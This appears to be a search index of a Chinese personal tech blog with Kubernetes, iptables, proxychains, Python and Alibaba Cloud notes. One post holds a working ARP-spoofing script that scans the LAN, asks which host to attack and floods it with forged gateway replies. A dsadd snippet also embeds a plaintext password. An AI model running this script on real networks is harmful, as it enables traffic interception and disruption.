","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:15","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#统计-cpu-最高的-pod"},{"categories":["blog"],"content":" 查看所有 worker 节点，排除不能调度的节点 kubectl get nodes |grep worker|grep Ready|wc -l ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:16","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#查看所有-worker-节点排除不能调度的节点"},{"categories":["blog"],"content":" 练习","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:3:0","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#练习"},{"categories":["blog"],"content":" nfs 相关全部指定命名空间 kubectl create namespace kentxxq 创建 NFS 的 pv 和 pvc. 其中 pv 是集群级别的，而 pvc 是有命名空间的。 04_kubernetes-storage_pv_pvc.yml apiVersion: v1 kind: PersistentVolume metadata: name: kentxxq-pv spec: capacity: storage: 3Gi accessModes: - ReadWriteMany nfs: # nfs的exports里配置的路径 path: /data/nfs server: 10.0.1.157 --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: kentxxq-pvc # 默认default namespace: default spec: accessModes: - ReadWriteMany # storageClassName如果不写，可能会使用默认sc。从而导致无法匹配 # 查看默认sc命令 kubectl get sc storageClassName: \"\" resources: requests: storage: 1Gi ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:3:1","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#nfs-相关"},{"categories":["blog"],"content":" storageClass 相关相关权限 02_kubernetes_sc_rbac.yaml apiVersion: v1 kind: Namespace metadata: name: kentxxq --- apiVersion: v1 kind: ServiceAccount metadata: name: nfs-provisioner namespace: kentxxq --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: nfs-provisioner namespace: kentxxq rules: # - apiGroups: [\"*\"] # \"\" 标明 core API 组 # resources: [\"*\"] # verbs: [\"*\"] - apiGroups: [\"\"] resources: [\"persistentvolumes\"] verbs: [\"get\", \"list\", \"watch\", \"create\", \"delete\"] - apiGroups: [\"\"] resources: [\"persistentvolumeclaims\"] verbs: [\"get\", \"list\", \"watch\", \"update\"] - apiGroups: [\"storage.k8s.io\"] resources: [\"storageclasses\"] verbs: [\"get\", \"list\", \"watch\"] - apiGroups: [\"\"] resources: [\"events\"] verbs: [\"watch\", \"create\", \"update\", \"patch\"] - apiGroups: [\"\"] resources: [\"services\", \"endpoints\"] verbs: [\"get\",\"create\",\"patch\",\"list\", \"watch\",\"update\"] - apiGroups: [\"extensions\"] resources: [\"podsecuritypolicies\"] resourceNames: [\"nfs-provisioner\"] verbs: [\"use\"] --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: nfs-provisioner namespace: kentxxq subjects: - kind: ServiceAccount name: nfs-provisioner namespace: kentxxq roleRef: kind: ClusterRole name: nfs-provisioner apiGroup: rbac.authorization.k8s.io 01_kubernetes_sc_provisioner.yaml apiVersion: apps/v1 kind: Deployment metadata: name: nfs-client-provisioner # 命名空间要与定制的rbac的一致 namespace: kentxxq spec: replicas: 1 selector: matchLabels: app: nfs-client-provisioner strategy: type: Recreate template: metadata: labels: app: nfs-client-provisioner spec: serviceAccount: nfs-provisioner containers: - name: nfs-client-provisioner # image: kubernetes-register.superopsmsb.com/google_containers/nfs-client-provisioner:latest image: registry.cn-beijing.aliyuncs.com/pylixm/nfs-subdir-external-provisioner:v4.0.0 volumeMounts: - name: nfs-client-root mountPath: /persistentvolumes env: - name: PROVISIONER_NAME # 该变量的值，必须与nfs的storageclass的provisioner的值一致 value: \"nfsprovisioner\" - name: NFS_SERVER # 设置NFS服务器的ip地址 value: \"10.0.1.157\" - name: NFS_PATH # 设置NFS服务器分享的目录 value: \"/data/nfs\" volumes: - name: nfs-client-root nfs: # 直接使用nfs来挂载该目录，方便storageclass基于该pod对pv和pvc进行自动处理 server: \"10.0.1.157\" path: \"/data/nfs\" 03_kubernetes_sc_pv.yaml apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: storageclass namespace: kentxxq # 每个 StorageClass 都包含 provisioner、parameters 和 reclaimPolicy 字段 # provisioner用来决定使用哪个卷插件分配PV，必须与nfs-client的容器内部的 PROVISIONER_NAME 变量一致 provisioner: \"nfsprovisioner\" # reclaimPolicy指定创建的Persistent Volume的回收策略 reclaimPolicy: Retain parameters: # archiveOnDelete: \"false\"表示在删除时不会对数据进行打包，当设置为true时表示删除时会对数据进行打包 archiveOnDelete: \"false\" 08_kubernetes_storage_sc_pvc.yaml apiVersion: v1 kind: PersistentVolumeClaim metadata: name: sc-pvc namespace: kentxxq labels: role: pvc spec: storageClassName: storageclass accessModes: - ReadWriteOnce # 定义资源要求PV满足这个PVC的要求才会匹配到 resources: requests: storage: 1Gi ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:3:2","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#storageclass-相关"},{"categories":["blog"],"content":" 绑定 pv 和 pvcpvc 会寻找合适的 pv，而 pv 可能会被其他 pvc 使用。 所以最好同时指定 pvc的volumeName , pv的claimRef。关于自动绑定可以看 这里 apiVersion: v1 kind: PersistentVolume metadata: name: pv0003 spec: storageClassName: \"\" capacity: storage: 5Gi accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Retain claimRef: namespace: default name: myclaim nfs: path: /tmp server: 172.17.0.2 --- kind: PersistentVolumeClaim apiVersion: v1 metadata: name: myclaim spec: # 避免被default storageClass创建 storageClassName: \"\" volumeName: \"pv0003\" accessModes: - ReadWriteOnce resources: requests: storage: 5Gi ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:3:3","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#绑定-pv-和-pvc"},{"categories":["blog"],"content":" 相关链接 查看已有的证书 登录The Linux Foundation 进入My Portal 查看对应证书的分数, 下载证书 认证考试前准备全介绍–考生姓名篇，全部考试流程 登录账号核销考试码，进行考试 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:4:0","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#相关链接"},{"categories":["point"],"content":"iptables 可以帮助进行 linux 的端口限速, 路由转发. 举例: *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] -A OUTPUT -p tcp --sport 444 -m limit --limit 50/s -j ACCEPT -A OUTPUT -p tcp --sport 444 -j DROP COMMIT ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/iptables/:0:0","series":null,"tags":["point","iptables"],"title":"iptables","uri":"/posts/%E7%AC%94%E8%AE%B0/point/iptables/#"},{"categories":["point"],"content":"proxychains 是 linux 下一个优秀的代理工具, 通常需要配合 clash 使用. ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/proxychains/:0:0","series":null,"tags":["point","proxychains"],"title":"proxychains","uri":"/posts/%E7%AC%94%E8%AE%B0/point/proxychains/#"},{"categories":["point"],"content":" 使用 # 安装 apt install proxychains -y # 连接到clash的本地7891端口 vim /etc/proxychains.conf # ProxyList format # type host port [user pass] # (values separated by 'tab' or 'blank') # # # Examples: # # socks5 192.168.67.78 1080 lamer secret # http 192.168.89.3 8080 justu hidden # socks4 192.168.1.49 1080 # http 192.168.39.93 8080 # # # proxy types: http, socks4, socks5 # ( auth types supported: \"basic\"-http \"user/pass\"-socks ) # [ProxyList] socks5 127.0.0.1 7891 # 进入一个代理bash proxychains bash ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/proxychains/:1:0","series":null,"tags":["point","proxychains"],"title":"proxychains","uri":"/posts/%E7%AC%94%E8%AE%B0/point/proxychains/#使用"},{"categories":["blog"],"content":"[[笔记/point/python|python]] 的 ARP 攻击脚本.","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-arp%E6%94%BB%E5%87%BB/","series":null,"tags":["blog","python"],"title":"python-ARP攻击","uri":"/posts/%E7%AC%94%E8%AE%B0/python-arp%E6%94%BB%E5%87%BB/"},{"categories":["blog"],"content":" 简介python 的 ARP 攻击脚本. ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-arp%E6%94%BB%E5%87%BB/:1:0","series":null,"tags":["blog","python"],"title":"python-ARP攻击","uri":"/posts/%E7%AC%94%E8%AE%B0/python-arp%E6%94%BB%E5%87%BB/#简介"},{"categories":["blog"],"content":" 内容 # coding:utf-8 from scapy.all import Ether, ARP, sendp from typing import Tuple import os import pprint import socket import netifaces import nmap import time def get_localhost_mac_address_and_gateway_ip(localhost_ip: str) -\u003e Tuple[str, str]: tmp_data = localhost_ip.split(\".\")[0:3] tmp_data.append(\"1\") gateway_ip = \".\".join(tmp_data) for gateway in netifaces.gateways().get(len(netifaces.gateways())): if gateway[0] == gateway_ip: mac_id = gateway[1] mac_addr = netifaces.ifaddresses(mac_id).get(netifaces.AF_LINK)[0][\"addr\"].upper() return (gateway_ip, mac_addr) # linux 系统 # addrs = netifaces.ifaddresses(\"en0\") # mac_address = addrs[netifaces.AF_LINK] # return mac_address[0][\"addr\"] def get_localhost_ip() -\u003e str: try: s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((\"114.114.114.114\", 80)) ip, port = s.getsockname() finally: s.close() return ip def get_hostname_by_id(ip) -\u003e str: try: return socket.gethostbyaddr(ip)[0] except Exception: return \"\" source_ip = get_localhost_ip() print(f\"本机ip地址：{source_ip}\") gateway_ip, source_mac = get_localhost_mac_address_and_gateway_ip(source_ip) print(f\"本机mac地址：{source_mac}\") print(f\"网关地址{gateway_ip}\") target_mac = \"E0:DC:FF:CD:CF:51\" print(f\"目标mac地址：{target_mac}\") target_ip = \"192.168.0.105\" print(f\"目标ip地址：{target_ip}\") def scan(gateway_ip) -\u003e list: ## 开始扫描 print(\"开始扫描\") start_time = time.time() nm = nmap.PortScanner() nm.scan(f\"{gateway_ip}/24\", arguments=\"sP\") print(\"完成扫描\") end_time = time.time() print(f\"耗时：{end_time-start_time}秒\") alive_hosts = [ host for host in nm.all_hosts() if nm[host][\"status\"][\"state\"] == \"up\" ] datas = [ ( nm[host][\"addresses\"][\"ipv4\"], nm[host][\"addresses\"][\"mac\"], nm[host][\"vendor\"].get(nm[host][\"addresses\"][\"mac\"], \"\"), get_hostname_by_id(nm[host][\"addresses\"][\"ipv4\"]) # 保存端口信息 nm[host].get(\"tcp\", {}), ) for host in alive_hosts if host != source_ip ] print(\"序号 ip地址 mac地址 设备提供商 主机名\") for key, data in enumerate(datas): print(f\"{key}：{data}\") return datas datas = scan(gateway_ip) while True: attack_host_num = input(\"请输入想要攻击的机器(如果大于机器列表会重新扫描):\\n\") if int(attack_host_num) \u003e len(datas): datas = scan(gateway_ip) else: break target_ip = datas[int(attack_host_num)][0] target_mac = datas[int(attack_host_num)][1] print(f\"受害者ip修改为:{target_ip}\") print(f\"受害者mac修改为:{target_mac}\") # 开始攻击 ether = Ether(src=source_mac, dst=target_mac) # 这里的op参数1是请求,2是响应 arp = ARP( hwsrc=source_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=2, ) pkg = ether / arp pkg.show() # inter代表每个包之间的间隔时间.loop代表循环发包 sendp(pkg, inter=0, loop=1) ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-arp%E6%94%BB%E5%87%BB/:2:0","series":null,"tags":["blog","python"],"title":"python-ARP攻击","uri":"/posts/%E7%AC%94%E8%AE%B0/python-arp%E6%94%BB%E5%87%BB/#内容"},{"categories":["blog"],"content":" 简介python 的小工具脚本和示例. ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/:1:0","series":null,"tags":["blog","python"],"title":"python-工具脚本","uri":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/:2:0","series":null,"tags":["blog","python"],"title":"python-工具脚本","uri":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/#内容"},{"categories":["blog"],"content":" pywinrm远程操作 windows 机器 host = winrm.Session( \"10.0.216.207\", (\"主机\\\\用户名\", \"密码\"), transport=\"ntlm\" ) result = host.run_cmd(cmd) print(result.status_code) print(result.std_out.decode(\"gbk\")) ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/:2:1","series":null,"tags":["blog","python"],"title":"python-工具脚本","uri":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/#pywinrm"},{"categories":["blog"],"content":" selenium 示例 # coding:utf-8 from selenium import webdriver options = webdriver.ChromeOptions() options.headless = True options.add_argument('--ignore-certificate-errors-spki-list') options.add_argument('--ignore-ssl-errors') options.add_argument('--disable-gpu') options.add_argument('--disable-dev-shm-usage') options.add_argument('--no-sandbox') driver = webdriver.Chrome(executable_path='/usr/local/bin/chromedriver', options=options) driver.get('https://kentxxq.com') print(driver.page_source) ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/:2:2","series":null,"tags":["blog","python"],"title":"python-工具脚本","uri":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/#selenium-示例"},{"categories":["blog"],"content":" 拼音处理 from pypinyin import pinyin, Style name = \"黄先桃\" py_name_list = pinyin(name, Style.NORMAL) first_name = py_name_list[0:1][0][0] second_name = \"\" for word in py_name_list[1:]: second_name += word[0] full_name = \"\" for word in py_name_list: full_name += word[0] print(py_name_list) print(full_name) print(first_name) print(second_name) cmd = f'dsadd user \"cn={full_name},OU=TZEDU,dc=tzict,dc=cn\" -pwd TZ#Eb2xpn -pwdneverexpires yes -fn {second_name} -ln {first_name} -display {full_name} -desc {name} -email {full_name}@mail.tanzk.com -memberof \"cn=wiki,OU=TZEDU,dc=tzict,dc=cn\"' print(cmd) ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/:2:3","series":null,"tags":["blog","python"],"title":"python-工具脚本","uri":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/#拼音处理"},{"categories":["blog"],"content":" sqlalchemy 生成 models sqlacodegen postgresql:///some_local_db sqlacodegen mysql+oursql://user:password@localhost/dbname sqlacodegen sqlite:///database.db # 指定输出文件 --outfile models.py # 默认输出对象类 # 指定输出为table对象 --noclasses sqlacodegen sqlite:///test.db --noclasses --outfile app/models.py sqlacodegen mysql+pymysql://用户名:密码@地址.mysql.rds.aliyuncs.com/om_all --noclasses --outfile app/models.py flask-sqlacodegen --flask mysql+pymysql://用户名:'密码'@IP地址/数据库名 --outfile model.py ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/:2:4","series":null,"tags":["blog","python"],"title":"python-工具脚本","uri":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/#sqlalchemy-生成-models"},{"categories":["blog"],"content":" pyinstaller 打包 命令 解释 -F 单个文件，通常单个文件这样 -D, –onedir 打包成文件夹，适合框架类型 -c 控制台应用 -w 窗口应用 -p 依赖包的路径 -d debug 模式 –version-file windows 版本信息 -m, –manifest windows 的 manifest 文件 –distpath DIR 程序输出路径 -y, –noconfirm 修改输出路径而不用确认 –clean 构建前清理缓存和临时文件 -i 应用图标 –add-binary 加二进制文件 –add-data 加文件或文件夹 # 打包成单个文件 # 如果没有资源文件，可以考虑使用这个 pyinstaller.exe -c -p E:\\kentxxq_code\\pytest\\.venv\\Lib\\site-packages -F .\\test.py # 打包成目录形式 # 如果有资源文件之类的，推荐打包成文件夹 pyinstaller.exe -c -p E:\\kentxxq_code\\pytest\\.venv\\Lib\\site-packages --add-data \"E:/kentxxq_code/pytest/Pipfile;.\" --clean -D .\\test.py ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/:2:5","series":null,"tags":["blog","python"],"title":"python-工具脚本","uri":"/posts/%E7%AC%94%E8%AE%B0/python-%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/#pyinstaller-打包"},{"categories":["point"],"content":"阿里云是国内最大的云平台, 属于阿里巴巴集团. 要点: 市场份额最大 功能应该是最全的 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E9%98%BF%E9%87%8C%E4%BA%91/:0:0","series":null,"tags":["point","阿里云"],"title":"阿里云","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E9%98%BF%E9%87%8C%E4%BA%91/#"},{"categories":["blog"],"content":" 简介这里记录 阿里云 上相关的产品的使用教程 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:1:0","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#简介"},{"categories":["blog"],"content":" kubernetes 自建flannel 的搭建完成以后，会发现 只有运行在本机的 pod 我请求 ip 能通 请求 service-nodeport 的 cluster-ip 有时候通，有时候不通（请求先到达 kube-proxy 的 iptables 规则，而规则是从 endpoint 里获取的。里面记录了多个 pod 的 ip，进行了负载均衡。一旦分配到了另外一个主机上的 pod，就会导致不通） 这是因为阿里云专有网络是一个 sdn 网络。因此需要创建自定义路由。 ifconfig vxlan.calico 查看到网卡信息，每个机器都有不同的网段，例如主机 1 是 10.244.79.64, 主机 2 是 10.244.32.128 自定义路由配置 10.244.79.0/24 下一跳到主机 1 10.244.32.0/24 下一跳到主机 2 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:2:0","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#kubernetes-自建"},{"categories":["blog"],"content":" SLS 日志","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:3:0","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#sls-日志"},{"categories":["blog"],"content":" 配置 进入查询页面 右上角 - 查询分析属性 属性 自动分析属性，追加 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:3:1","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#配置"},{"categories":["blog"],"content":" 语法 # 普通查询 level: ERROR # 统计查询 * and level: ERROR | select sum(1) as \"err_count\",\"__tag__:app_name\" GROUP by \"__tag__:app_name\" ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:3:2","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#语法"},{"categories":["blog"],"content":" 查询与告警 查询集锦请求的主机次数排序 * | select count(1) , host group by host order by count(1) desc 请求最多的客户端 ip * and host: www.kentxxq.com | select count(1) , client_ip group by client_ip order by count(1) desc 有多少个不同的 ip 请求 , 估算函数-文档地址 * | select approx_distinct(client_ip) 同比查询与告警 * not client_ip: \"10.*\" and host: gateway.kentxxq.com | select url2, proxy_upstream_name, diff [1] as today_total, diff [2] as yesterday_total, diff [1]-diff [2] as inc, round(diff [1] / diff [2],2) as inc2 FROM ( select url2, proxy_upstream_name, compare(count, 86400) as diff FROM ( select regexp_extract(split_part(url, '?', 1),'(.*\\D)\\d*?') as url2, proxy_upstream_name, COUNT(*) as count FROM log GROUP by regexp_extract(split_part(url, '?', 1),'(.*\\D)\\d*?') , proxy_upstream_name ) group by url2, proxy_upstream_name ) where diff [1]-diff [2] \u003e 2000 and round(diff [1] / diff [2],2) \u003e 1.5 order by inc desc url2 请求地址 proxy_upstream_name 服务名称 today_total 今日请求次数 yesterday_total 昨日请求次数 inc 增长数量 inc2 增长环比 告警模板: # 告警模板 - 告警严重度：${severity} - 告警内容：${{ alert.annotations.desc }} - 告警首次触发时间：${fire_time} - 此次评估的触发时间：${alert_time} - 告警规则所在Project：${project} 对比前一天同时段1小时内 {%- for item in alert.results[0].raw_results %} - 服务名 : {{ item.proxy_upstream_name }} ,请求地址: {{ item.url2 }} , 新增请求 : {{ item.inc }} {%- endfor %} [[详情](${query_url})] ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:3:3","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#查询与告警"},{"categories":["blog"],"content":" 查询与告警 查询集锦请求的主机次数排序 * | select count(1) , host group by host order by count(1) desc 请求最多的客户端 ip * and host: www.kentxxq.com | select count(1) , client_ip group by client_ip order by count(1) desc 有多少个不同的 ip 请求 , 估算函数-文档地址 * | select approx_distinct(client_ip) 同比查询与告警 * not client_ip: \"10.*\" and host: gateway.kentxxq.com | select url2, proxy_upstream_name, diff [1] as today_total, diff [2] as yesterday_total, diff [1]-diff [2] as inc, round(diff [1] / diff [2],2) as inc2 FROM ( select url2, proxy_upstream_name, compare(count, 86400) as diff FROM ( select regexp_extract(split_part(url, '?', 1),'(.*\\D)\\d*?') as url2, proxy_upstream_name, COUNT(*) as count FROM log GROUP by regexp_extract(split_part(url, '?', 1),'(.*\\D)\\d*?') , proxy_upstream_name ) group by url2, proxy_upstream_name ) where diff [1]-diff [2] \u003e 2000 and round(diff [1] / diff [2],2) \u003e 1.5 order by inc desc url2 请求地址 proxy_upstream_name 服务名称 today_total 今日请求次数 yesterday_total 昨日请求次数 inc 增长数量 inc2 增长环比 告警模板: # 告警模板 - 告警严重度：${severity} - 告警内容：${{ alert.annotations.desc }} - 告警首次触发时间：${fire_time} - 此次评估的触发时间：${alert_time} - 告警规则所在Project：${project} 对比前一天同时段1小时内 {%- for item in alert.results[0].raw_results %} - 服务名 : {{ item.proxy_upstream_name }} ,请求地址: {{ item.url2 }} , 新增请求 : {{ item.inc }} {%- endfor %} [[详情](${query_url})] ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:3:3","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#查询集锦"},{"categories":["blog"],"content":" 查询与告警 查询集锦请求的主机次数排序 * | select count(1) , host group by host order by count(1) desc 请求最多的客户端 ip * and host: www.kentxxq.com | select count(1) , client_ip group by client_ip order by count(1) desc 有多少个不同的 ip 请求 , 估算函数-文档地址 * | select approx_distinct(client_ip) 同比查询与告警 * not client_ip: \"10.*\" and host: gateway.kentxxq.com | select url2, proxy_upstream_name, diff [1] as today_total, diff [2] as yesterday_total, diff [1]-diff [2] as inc, round(diff [1] / diff [2],2) as inc2 FROM ( select url2, proxy_upstream_name, compare(count, 86400) as diff FROM ( select regexp_extract(split_part(url, '?', 1),'(.*\\D)\\d*?') as url2, proxy_upstream_name, COUNT(*) as count FROM log GROUP by regexp_extract(split_part(url, '?', 1),'(.*\\D)\\d*?') , proxy_upstream_name ) group by url2, proxy_upstream_name ) where diff [1]-diff [2] \u003e 2000 and round(diff [1] / diff [2],2) \u003e 1.5 order by inc desc url2 请求地址 proxy_upstream_name 服务名称 today_total 今日请求次数 yesterday_total 昨日请求次数 inc 增长数量 inc2 增长环比 告警模板: # 告警模板 - 告警严重度：${severity} - 告警内容：${{ alert.annotations.desc }} - 告警首次触发时间：${fire_time} - 此次评估的触发时间：${alert_time} - 告警规则所在Project：${project} 对比前一天同时段1小时内 {%- for item in alert.results[0].raw_results %} - 服务名 : {{ item.proxy_upstream_name }} ,请求地址: {{ item.url2 }} , 新增请求 : {{ item.inc }} {%- endfor %} [[详情](${query_url})] ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:3:3","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#同比查询与告警"},{"categories":["blog"],"content":" OSS 的 sts 上传配置","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:4:0","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#oss-的-sts-上传配置"},{"categories":["blog"],"content":" 跨域oss=》数据安全=》跨域设置=》创建规则 来源 * 允许所有 methods headers* 暴露 headers Etag x-oss-request-id Content-Range 缓存 60 秒 返回 vary: origin 勾上 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:4:1","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#跨域"},{"categories":["blog"],"content":" 权限使用STS临时访问凭证访问OSS_对象存储-阿里云帮助中心 创建角色 RamOssTest 策略 { \"Version\": \"1\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": \"oss:PutObject\", \"Resource\": [ \"acs:oss:*:*:xxx-prod/\", \"acs:oss:*:*:xxx-prod/*\", \"acs:oss:*:*:xxx-test/\", \"acs:oss:*:*:xxxtest/*\" ] } ] } 信任策略 { \"Statement\": [ { \"Action\": \"sts:AssumeRole\", \"Effect\": \"Allow\", \"Principal\": { \"RAM\": [ \"acs:ram::1784459943823235:root\" ] } } ], \"Version\": \"1\" } 授权 AliyunSTSAssumeRoleAccess 调用 STS 服务 AssumeRole 接口的权限 于是就可以用 sts 创建临时 token 调用了 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:4:2","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#权限"},{"categories":["blog"],"content":" 磁盘","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:5:0","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#磁盘"},{"categories":["blog"],"content":" 扩容一般来说阿里云都是 MBR分区 + ext4文件系统. 如果不对, 就去官网看操作. # 查看磁盘 # Disk label type值为dos表示MBR分区，值为gpt表示GPT分区 fdisk -lu # 确保工具安装完成 apt update -y type growpart || apt install -y cloud-guest-utils # 扩容 LC_ALL=en_US.UTF-8 growpart /dev/vdb 1 # 查看文件系统,一般是ext4 df -Th # 扩容 resize2fs /dev/vdb1 # 验证效果 df -Th 参考链接: 云盘扩容指引_云服务器 ECS-阿里云帮助中心 